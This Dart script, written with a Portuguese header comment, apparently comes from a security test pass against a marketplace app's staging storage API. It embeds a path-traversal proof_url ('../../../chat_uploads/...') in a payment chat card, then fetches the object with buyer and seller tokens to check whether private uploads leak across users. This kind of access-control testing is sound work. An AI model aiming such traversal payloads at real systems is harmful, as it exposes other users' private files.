/// pass2b — 3× ../ para chat_uploads; GET binário vendedor.
import 'dart:io';
import 'dart:typed_data';

import '_rtbm.dart';

Future<({int status, int bytes})> getBytes(String url, String jwt, String apikey) async {
  final client = HttpClient();
  try {
    final rq = await client.getUrl(Uri.parse(url));
    rq.headers.set('apikey', apikey);
    rq.headers.set('Authorization', 'Bearer $jwt');
    final rs = await rq.close();
    final chunks = <int>[];
    await for (final c in rs) {
      chunks.addAll(c);
    }
    return (status: rs.statusCode, bytes: chunks.length);
  } finally {
    client.close(force: true);
  }
}

Future<void> main() async {
  final c = Rtbm.fromEnv(loadEnv());
  await c.loginActors();
  const chatId = 'dd403563-7dc5-436b-a465-d684986024bd';
  const oid = '7fe460e8-d13b-42d3-bea2-a690cb8c0373';
  final buyer = c.buyerId!;
  final raw =
      '$stagingHost/storage/v1/object/fleaber_private/order_proofs/$buyer/$oid/../../../chat_uploads/$buyer/$chatId/rtbm_fake.jpg';
  final parsed = Uri.parse(raw);
  stdout.writeln('PARSED ${parsed.toString()}');

  final card = await c.postMsg(
    chatId: chatId,
    text: jsonCard({
      'kind': 'reservation_payment_submitted',
      'order_id': oid,
      'notes': 'ok',
      'proof_url': raw,
    }),
  );
  stdout.writeln('CARD ${card.status} contains_dotdot=${(card.map?['text'] ?? '').toString().contains('../')}');

  final authPath =
      '$stagingHost/storage/v1/object/authenticated/fleaber_private/chat_uploads/$buyer/$chatId/rtbm_fake.jpg';
  final bObj = await getBytes(parsed.toString(), c.buyerJwt!, c.anon);
  final sObj = await getBytes(parsed.toString(), c.sellerJwt!, c.anon);
  final bAuth = await getBytes(authPath, c.buyerJwt!, c.anon);
  final sAuth = await getBytes(authPath, c.sellerJwt!, c.anon);
  stdout.writeln('OBJ_B ${bObj.status} ${bObj.bytes}b');
  stdout.writeln('OBJ_S ${sObj.status} ${sObj.bytes}b');
  stdout.writeln('AUTH_B ${bAuth.status} ${bAuth.bytes}b');
  stdout.writeln('AUTH_S ${sAuth.status} ${sAuth.bytes}b');

  await dumpJson('${outDir()}/pass2b.json', {
    'raw': raw,
    'parsed': parsed.toString(),
    'card_status': card.status,
    'stored_has_dotdot': (card.map?['text'] ?? '').toString().contains('../'),
    'stored': card.map?['text'],
    'obj_buyer': '${bObj.status} ${bObj.bytes}',
    'obj_seller': '${sObj.status} ${sObj.bytes}',
    'auth_buyer': '${bAuth.status} ${bAuth.bytes}',
    'auth_seller': '${sAuth.status} ${sAuth.bytes}',
  });
}
